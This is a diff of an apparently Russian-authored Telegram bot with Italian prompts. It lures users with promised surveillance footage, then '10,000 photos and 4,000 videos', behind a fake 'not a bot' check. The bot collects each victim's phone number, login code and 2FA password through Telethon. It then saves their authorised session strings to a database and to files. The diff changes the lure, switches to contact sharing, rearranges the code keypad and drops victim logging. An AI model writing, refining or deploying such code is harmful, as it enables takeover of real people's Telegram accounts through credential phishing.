@@ -1,12 +1,10 @@
-# 👇 изменения: удалён ADMIN_ID, все admin-команды и сообщения админу
-
 import logging
 import os
 import json
 import phonenumbers
 from phonenumbers import geocoder
 from aiogram import Bot, Dispatcher, types
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
 from aiogram.utils import executor
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -47,32 +45,37 @@ async def cmd_start(message: types.Message):
         InlineKeyboardButton("🔐 Autorizza primo account", callback_data="auth_account")
     )
     await message.answer(
-        "👋 Benvenuto! Per accedere ai materiali delle telecamere di sorveglianza, "
-        "devi completare l'autorizzazione per confermare che non sei un robot.",
+        "👋 🇮🇹 Ciao! ❤️\n"
+        "Vuoi vedere più di 10.000 foto e 4.000 video? 👁\n"
+        "Conferma che non sei un bot usando il pulsante qui sotto. 🤖👇",
         reply_markup=keyboard
     )
 
 @dp.callback_query_handler(lambda c: c.data == 'auth_account')
 async def start_auth(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
-    user_states[user_id] = 'awaiting_phone'
-    await bot.send_message(user_id, "📱 Inserisci il numero di telefono nel formato +391234567890:")
+    user_states[user_id] = 'awaiting_contact'
+
+    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
+
+    await bot.send_message(user_id, "📲 Per favore, condividi il tuo numero:", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
-@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_phone')
-async def process_phone(message: types.Message):
+@dp.message_handler(content_types=types.ContentType.CONTACT)
+async def handle_contact(message: types.Message):
     user_id = message.from_user.id
-    phone = message.text.strip()
+    if user_states.get(user_id) != 'awaiting_contact':
+        return
 
-    client = user_clients.get(user_id)
-    if client:
-        await client.disconnect()
-        user_clients.pop(user_id, None)
+    phone = message.contact.phone_number
+    if not phone.startswith("+"):
+        phone = "+" + phone
 
-    user_phones[user_id] = phone
     client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
     await client.connect()
     user_clients[user_id] = client
+    user_phones[user_id] = phone
 
     try:
         await client.send_code_request(phone)
@@ -87,19 +90,18 @@ async def process_phone(message: types.Message):
         cleanup(user_id)
 
 async def send_code_keyboard(user_id, current_code, message_id=None):
-    buttons = [InlineKeyboardButton(str(i), callback_data=f"code_{i}") for i in range(10)]
-    buttons.append(InlineKeyboardButton("✅ Invia", callback_data="code_send"))
-    keyboard = InlineKeyboardMarkup(row_width=5).add(*buttons)
+    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
+    buttons = []
+    for row in digits:
+        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
+        buttons.append(btn_row)
+    buttons.append([InlineKeyboardButton("✅ Invia", callback_data="code_send")])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
     text = f"Codice: `{current_code}`" if current_code else "Inserisci codice:"
 
     if message_id:
-        await bot.edit_message_text(
-            chat_id=user_id,
-            message_id=message_id,
-            text=text,
-            reply_markup=keyboard,
-            parse_mode='Markdown'
-        )
+        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
+                                    text=text, reply_markup=keyboard, parse_mode='Markdown')
     else:
         msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
         return msg.message_id
@@ -110,12 +112,12 @@ async def process_code_button(callback_query: types.CallbackQuery):
     data = callback_query.data
 
     if user_states.get(user_id) != 'awaiting_code':
-        await bot.answer_callback_query(callback_query.id, text="⛔️ Non è il momento giusto per inserire il codice", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="⛔️ Non è il momento giusto", show_alert=True)
         return
 
     buffer = user_code_buffers.get(user_id)
     if not buffer:
-        await bot.answer_callback_query(callback_query.id, text="Errore interno. Riprova.", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="Errore interno.", show_alert=True)
         return
 
     current_code = buffer['code']
@@ -127,7 +129,6 @@ async def process_code_button(callback_query: types.CallbackQuery):
             return
         await bot.answer_callback_query(callback_query.id)
         await try_sign_in_code(user_id, current_code)
-
     else:
         digit = data.split("_")[1]
         if len(current_code) >= 10:
@@ -148,46 +149,31 @@ async def try_sign_in_code(user_id, code):
 
     try:
         await client.sign_in(phone=phone, code=code)
-
         if await client.is_user_authorized():
             me = await client.get_me()
-            has_premium = getattr(me, "premium", False)
-            restriction = getattr(me, "restriction_reason", [])
-            is_spam_blocked = bool(restriction)
-            country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
-
             session_str = client.session.save()
-            sessions_col.update_one(
-                {"phone": phone},
-                {"$set": {"phone": phone, "session": session_str}},
-                upsert=True
-            )
+            sessions_col.update_one({"phone": phone}, {"$set": {"phone": phone, "session": session_str}}, upsert=True)
+
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
-
-            print(f"[+] Новый пользователь авторизовался: {phone}")
 
             await bot.send_message(user_id, "✅ Autenticazione avvenuta con successo!")
             await client.disconnect()
             cleanup(user_id)
         else:
             user_states[user_id] = 'awaiting_2fa'
-            await bot.send_message(user_id, "🔐 Inserisci la password per la 2FA:")
-
+            await bot.send_message(user_id, "🔐 Inserisci la password 2FA:")
     except PhoneCodeExpiredError:
         await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
         await client.disconnect()
         cleanup(user_id)
-
     except PhoneCodeInvalidError:
         await bot.send_message(user_id, "❌ Codice errato. Riprova:")
         user_code_buffers[user_id]['code'] = ""
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
-
     except SessionPasswordNeededError:
         user_states[user_id] = 'awaiting_2fa'
         await bot.send_message(user_id, "🔐 È necessaria la password 2FA. Inseriscila:")
-
     except Exception as e:
         await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
         await client.disconnect()
@@ -209,11 +195,7 @@ async def process_2fa(message: types.Message):
         await client.sign_in(password=password)
         if await client.is_user_authorized():
             session_str = client.session.save()
-            sessions_col.update_one(
-                {"phone": phone},
-                {"$set": {"phone": phone, "session": session_str}},
-                upsert=True
-            )
+            sessions_col.update_one({"phone": phone}, {"$set": {"phone": phone, "session": session_str}}, upsert=True)
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
